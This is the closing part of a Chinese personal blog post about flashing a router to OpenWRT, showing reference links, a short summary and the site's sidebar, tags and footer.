<p>基本上照着恩山论坛里的这帖子做就可以了: <a href="https://www.right.com.cn/forum/thread-2661027-1-1.html" target="_blank">https://www.right.com.cn/forum/thread-2661027-1-1.html</a></p>
<p>我还参考了另一篇博客: <a href="https://blog.hiirachan.moe/archives/1598021438.html" target="_blank">https://blog.hiirachan.moe/archives/1598021438.html</a></p>
<h2 id="总结">总结</h2>
<p>一番折腾下来, 我总算是配好了一个能用的原版 OpenWRT.</p>
<p>&hellip; 然后我转头就去用 hfy166 大佬的固件了 (真香!).</p>
<p>不过在折腾的过程中还是学到了很多东西, 所以时间也不算白费吧.</p>
    </div>
</article>


<div class="license markdown-body">
    <blockquote>
        <p>除特殊注明部分，本站内容采用 <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/"
               target="_blank">CC BY-NC-SA 4.0</a> 进行许可。</p>
    </blockquote>
</div>



            </div>
            <aside class="col-12 col-md-3 float-left sidebar">
    
    <div class="sidebar-item sidebar-pages">
        <h3>页面</h3>
        <ul>
            
            <li>
                <a href="/">Home</a>
            </li>
            
            <li>
                <a href="/archives/">Archives</a>
            </li>
            
            <li>
                <a href="/about/">About</a>
            </li>
            
            <li>
                <a href="/search/">Search</a>
            </li>
            
            <li>
                <a href="/index.xml">RSS</a>
            </li>
            
        </ul>
    </div>
    
    <div class="sidebar-item sidebar-links">
        <h3>链接</h3>
        <ul>
            
            <li>
                <a href="https://github.com/Origami404" target="_blank"><span>GitHub</span></a>
            </li>
            
            <li>
                <a href="https://wiki.hitsz.org" target="_blank"><span>HITsz LUG wiki</span></a>
            </li>
            
            <li>
                <a href="https://space.bilibili.com/1124374292" target="_blank"><span>bilibili</span></a>
            </li>
            
        </ul>
    </div>
    
    <div class="sidebar-item sidebar-tags">
        <h3>标签</h3>
        <div>
            
            <span>
                <a href="/tags/arch/">Arch</a>
            </span>
            
            <span>
                <a href="/tags/arm/">ARM</a>
            </span>
            
            <span>
                <a href="/tags/c/">C</a>
            </span>
            
            <span>
                <a href="/tags/clang/">Clang</a>
            </span>
            
            <span>
                <a href="/tags/docker/">Docker</a>
            </span>
            
            <span>
                <a href="/tags/git/">Git</a>
            </span>
            
            <span>
                <a href="/tags/haskell/">Haskell</a>
            </span>
            
            <span>
                <a href="/tags/https/">HTTPS</a>
            </span>
            
            <span>
                <a href="/tags/linux-%E5%B7%A5%E5%85%B7/">linux 工具</a>
            </span>
            
            <span>
                <a href="/tags/llvm/">LLVM</a>
            </span>
            
            <span>
                <a href="/tags/mgit/">mgit</a>
            </span>
            
            <span>
                <a href="/tags/python/">Python</a>
            </span>
            
            <span>
                <a href="/tags/windows/">Windows</a>
            </span>
            
            <span>
                <a href="/tags/%E5%88%9D%E5%AD%A6/">初学</a>
            </span>
            
            <span>
                <a href="/tags/%E5%88%B7%E6%9C%BA/">刷机</a>
            </span>
            
            <span>
                <a href="/tags/%E5%8F%98%E5%88%86%E6%B3%95/">变分法</a>
            </span>
            
            <span>
                <a href="/tags/%E5%9B%BE%E8%AE%BA/">图论</a>
            </span>
            
            <span>
                <a href="/tags/%E5%9F%9F%E5%90%8D/">域名</a>
            </span>
            
            <span>
                <a href="/tags/%E5%AF%BC%E8%AE%BA/">导论</a>
            </span>
            
            <span>
                <a href="/tags/%E6%88%91%E4%BC%9A%E7%86%9F%E7%BB%83%E5%9C%B0%E5%AE%89%E8%A3%85xxx%E7%B3%BB%E5%88%97/">我会熟练地安装xxx系列</a>
            </span>
            
            <span>
                <a href="/tags/%E6%8A%98%E8%85%BE/">折腾</a>
            </span>
            
            <span>
                <a href="/tags/%E6%95%B0%E5%AD%A6/">数学</a>
            </span>
            
            <span>
                <a href="/tags/%E6%96%B0%E8%A7%82%E7%82%B9/">新观点</a>
            </span>
            
            <span>
                <a href="/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AE%A1%E7%90%86/">服务器管理</a>
            </span>
            
            <span>
                <a href="/tags/%E6%AF%95%E6%98%87%E6%9D%AF/">毕昇杯</a>
            </span>
            
            <span>
                <a href="/tags/%E6%B1%87%E7%BC%96/">汇编</a>
            </span>
            
            <span>
                <a href="/tags/%E7%90%86%E8%AE%BA%E7%89%A9%E7%90%86/">理论物理</a>
            </span>
            
            <span>
                <a href="/tags/%E7%B3%9F%E7%B3%95%E4%BD%86%E5%80%BC%E5%BE%97%E7%BA%AA%E5%BF%B5%E7%9A%84%E4%B8%9C%E8%A5%BF/">糟糕但值得纪念的东西</a>
            </span>
            
            <span>
                <a href="/tags/%E7%BA%BF%E4%BB%A3/">线代</a>
            </span>
            
            <span>
                <a href="/tags/%E7%BC%96%E7%A8%8B/">编程</a>
            </span>
            
            <span>
                <a href="/tags/%E7%BC%96%E8%AF%91%E5%89%8D%E7%AB%AF/">编译前端</a>
            </span>
            
            <span>
                <a href="/tags/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/">编译原理</a>
            </span>
            
            <span>
                <a href="/tags/%E7%BF%BB%E8%AF%91/">翻译</a>
            </span>
            
            <span>
                <a href="/tags/%E8%87%AA%E7%95%99%E5%9C%B0/">自留地</a>
            </span>
            
            <span>
                <a href="/tags/%E8%87%AA%E8%A8%80%E8%87%AA%E8%AF%AD/">自言自语</a>
            </span>
            
            <span>
                <a href="/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/">读书笔记</a>
            </span>
            
            <span>
                <a href="/tags/%E8%BD%AE%E5%AD%90/">轮子</a>
            </span>
            
            <span>
                <a href="/tags/%E9%9D%9E%E6%8A%80%E6%9C%AF/">非技术</a>
            </span>
            
        </div>
    </div>
    <div class="sidebar-item sidebar-toc">
        <h3>目录</h3><nav id="TableOfContents">
  <ul>
    <li><a href="#背景">背景</a></li>
    <li><a href="#各类固件介绍与获得">各类固件介绍与获得</a>
      <ul>
        <li><a href="#原版-openwrt">原版 OpenWRT</a></li>
        <li><a href="#各类基于-openwrt-的定制固件">各类基于 OpenWRT 的定制固件</a></li>
        <li><a href="#编译-lean-大的-lede">编译 Lean 大的 LEDE</a></li>
        <li><a href="#老毛子--潘多拉">老毛子 / 潘多拉</a></li>
      </ul>
    </li>
    <li><a href="#刷机过程">刷机过程</a>
      <ul>
        <li><a href="#获取原系统的控制权">获取原系统的控制权</a></li>
        <li><a href="#刷-bl">刷 BL</a></li>
        <li><a href="#刷底包">刷底包</a></li>
        <li><a href="#web-刷入">Web 刷入</a></li>
        <li><a href="#命令行刷入">命令行刷入</a></li>
      </ul>
    </li>
    <li><a href="#刷机之后">刷机之后</a>
      <ul>
        <li><a href="#修改-opkg-源">修改 opkg 源</a></li>
        <li><a href="#获取各类特色插件">获取各类特色插件</a></li>
        <li><a href="#校园网多拨-ipv4">校园网多拨 (IPv4)</a></li>
        <li><a href="#校园网-ipv6-nat6">校园网 IPv6 NAT6</a></li>
      </ul>
    </li>
    <li><a href="#总结">总结</a></li>
  </ul>
</nav></div>
</aside>

        </div>
        <div class="btn">
    <div class="btn-menu" id="btn-menu">
        <i class="iconfont icon-grid-sharp"></i>
    </div>
    <div class="btn-toggle-mode">
        <i class="iconfont icon-contrast-sharp"></i>
    </div>
    <div class="btn-scroll-top">
        <i class="iconfont icon-chevron-up-circle-sharp"></i>
    </div>
</div>
<aside class="sidebar-mobile" style="display: none;">
  <div class="sidebar-wrapper">
    
    <div class="sidebar-item sidebar-pages">
        <h3>页面</h3>
        <ul>
            
            <li>
                <a href="/">Home</a>
            </li>
            
            <li>
                <a href="/archives/">Archives</a>
            </li>
            
            <li>
                <a href="/about/">About</a>
            </li>
            
            <li>
                <a href="/search/">Search</a>
            </li>
            
            <li>
                <a href="/index.xml">RSS</a>
            </li>
            
        </ul>
    </div>
    
    <div class="sidebar-item sidebar-links">
        <h3>链接</h3>
        <ul>
            
            <li>
                <a href="https://github.com/Origami404" target="_blank"><span>GitHub</span></a>
            </li>
            
            <li>
                <a href="https://wiki.hitsz.org" target="_blank"><span>HITsz LUG wiki</span></a>
            </li>
            
            <li>
                <a href="https://space.bilibili.com/1124374292" target="_blank"><span>bilibili</span></a>
            </li>
            
        </ul>
    </div>
    
    <div class="sidebar-item sidebar-tags">
        <h3>标签</h3>
        <div>
            
            <span>
                <a href="/tags/arch/">Arch</a>
            </span>
            
            <span>
                <a href="/tags/arm/">ARM</a>
            </span>
            
            <span>
                <a href="/tags/c/">C</a>
            </span>
            
            <span>
                <a href="/tags/clang/">Clang</a>
            </span>
            
            <span>
                <a href="/tags/docker/">Docker</a>
            </span>
            
            <span>
                <a href="/tags/git/">Git</a>
            </span>
            
            <span>
                <a href="/tags/haskell/">Haskell</a>
            </span>
            
            <span>
                <a href="/tags/https/">HTTPS</a>
            </span>
            
            <span>
                <a href="/tags/linux-%E5%B7%A5%E5%85%B7/">linux 工具</a>
            </span>
            
            <span>
                <a href="/tags/llvm/">LLVM</a>
            </span>
            
            <span>
                <a href="/tags/mgit/">mgit</a>
            </span>
            
            <span>
                <a href="/tags/python/">Python</a>
            </span>
            
            <span>
                <a href="/tags/windows/">Windows</a>
            </span>
            
            <span>
                <a href="/tags/%E5%88%9D%E5%AD%A6/">初学</a>
            </span>
            
            <span>
                <a href="/tags/%E5%88%B7%E6%9C%BA/">刷机</a>
            </span>
            
            <span>
                <a href="/tags/%E5%8F%98%E5%88%86%E6%B3%95/">变分法</a>
            </span>
            
            <span>
                <a href="/tags/%E5%9B%BE%E8%AE%BA/">图论</a>
            </span>
            
            <span>
                <a href="/tags/%E5%9F%9F%E5%90%8D/">域名</a>
            </span>
            
            <span>
                <a href="/tags/%E5%AF%BC%E8%AE%BA/">导论</a>
            </span>
            
            <span>
                <a href="/tags/%E6%88%91%E4%BC%9A%E7%86%9F%E7%BB%83%E5%9C%B0%E5%AE%89%E8%A3%85xxx%E7%B3%BB%E5%88%97/">我会熟练地安装xxx系列</a>
            </span>
            
            <span>
                <a href="/tags/%E6%8A%98%E8%85%BE/">折腾</a>
            </span>
            
            <span>
                <a href="/tags/%E6%95%B0%E5%AD%A6/">数学</a>
            </span>
            
            <span>
                <a href="/tags/%E6%96%B0%E8%A7%82%E7%82%B9/">新观点</a>
            </span>
            
            <span>
                <a href="/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AE%A1%E7%90%86/">服务器管理</a>
            </span>
            
            <span>
                <a href="/tags/%E6%AF%95%E6%98%87%E6%9D%AF/">毕昇杯</a>
            </span>
            
            <span>
                <a href="/tags/%E6%B1%87%E7%BC%96/">汇编</a>
            </span>
            
            <span>
                <a href="/tags/%E7%90%86%E8%AE%BA%E7%89%A9%E7%90%86/">理论物理</a>
            </span>
            
            <span>
                <a href="/tags/%E7%B3%9F%E7%B3%95%E4%BD%86%E5%80%BC%E5%BE%97%E7%BA%AA%E5%BF%B5%E7%9A%84%E4%B8%9C%E8%A5%BF/">糟糕但值得纪念的东西</a>
            </span>
            
            <span>
                <a href="/tags/%E7%BA%BF%E4%BB%A3/">线代</a>
            </span>
            
            <span>
                <a href="/tags/%E7%BC%96%E7%A8%8B/">编程</a>
            </span>
            
            <span>
                <a href="/tags/%E7%BC%96%E8%AF%91%E5%89%8D%E7%AB%AF/">编译前端</a>
            </span>
            
            <span>
                <a href="/tags/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/">编译原理</a>
            </span>
            
            <span>
                <a href="/tags/%E7%BF%BB%E8%AF%91/">翻译</a>
            </span>
            
            <span>
                <a href="/tags/%E8%87%AA%E7%95%99%E5%9C%B0/">自留地</a>
            </span>
            
            <span>
                <a href="/tags/%E8%87%AA%E8%A8%80%E8%87%AA%E8%AF%AD/">自言自语</a>
            </span>
            
            <span>
                <a href="/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/">读书笔记</a>
            </span>
            
            <span>
                <a href="/tags/%E8%BD%AE%E5%AD%90/">轮子</a>
            </span>
            
            <span>
                <a href="/tags/%E9%9D%9E%E6%8A%80%E6%9C%AF/">非技术</a>
            </span>
            
        </div>
    </div>
    
    
    
    <div class="sidebar-item sidebar-toc">
        <h3>目录</h3>
        <nav id="TableOfContents">
  <ul>
    <li><a href="#背景">背景</a></li>
    <li><a href="#各类固件介绍与获得">各类固件介绍与获得</a>
      <ul>
        <li><a href="#原版-openwrt">原版 OpenWRT</a></li>
        <li><a href="#各类基于-openwrt-的定制固件">各类基于 OpenWRT 的定制固件</a></li>
        <li><a href="#编译-lean-大的-lede">编译 Lean 大的 LEDE</a></li>
        <li><a href="#老毛子--潘多拉">老毛子 / 潘多拉</a></li>
      </ul>
    </li>
    <li><a href="#刷机过程">刷机过程</a>
      <ul>
        <li><a href="#获取原系统的控制权">获取原系统的控制权</a></li>
        <li><a href="#刷-bl">刷 BL</a></li>
        <li><a href="#刷底包">刷底包</a></li>
        <li><a href="#web-刷入">Web 刷入</a></li>
        <li><a href="#命令行刷入">命令行刷入</a></li>
      </ul>
    </li>
    <li><a href="#刷机之后">刷机之后</a>
      <ul>
        <li><a href="#修改-opkg-源">修改 opkg 源</a></li>
        <li><a href="#获取各类特色插件">获取各类特色插件</a></li>
        <li><a href="#校园网多拨-ipv4">校园网多拨 (IPv4)</a></li>
        <li><a href="#校园网-ipv6-nat6">校园网 IPv6 NAT6</a></li>
      </ul>
    </li>
    <li><a href="#总结">总结</a></li>
  </ul>
</nav>
    </div>
    
    
  </div>
</aside>
    </main>

    <footer>
    <div class="container-lg clearfix">
        <div class="col-12 footer">
            
            <span>&copy; 2019-2022
                <a href="https://blog.origami404.top/">Origami404</a>
                
                | 基于 <a href="https://github.com/dsrkafuu/hugo-theme-fuji/"
                   target="_blank">Fuji-v2</a> &amp; <a href="https://gohugo.io/"
                                                    target="_blank">Hugo</a> 构建
            </span>
        </div>
    </div>
</footer>

    
<script defer src="https://cdn.jsdelivr.net/npm/medium-zoom@1.0.6/dist/medium-zoom.min.js"></script>
<script defer src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script>
<script defer src="https://cdn.jsdelivr.net/npm/prismjs@1.27.0/components/prism-core.min.js"></script>
<script defer src="https://cdn.jsdelivr.net/npm/prismjs@1.27.0/plugins/autoloader/prism-autoloader.min.js"></script>



<script defer src="/assets/js/fuji.min.js"></script>

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.15.3/dist/katex.min.css" />
<script src="https://cdn.jsdelivr.net/npm/katex@0.15.3/dist/katex.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/katex@0.15.3/dist/contrib/auto-render.min.js"></script>
<script>
  renderMathInElement(document.querySelector('div.content'), {
    delimiters: [
      { left: '$$', right: '$$', display: true },
      { left: '\\[', right: '\\]', display: true },
      { left: '$', right: '$', display: false },
      { left: '\\(', right: '\\)', display: false },
    ],
  });
</script>




</body>

</html>
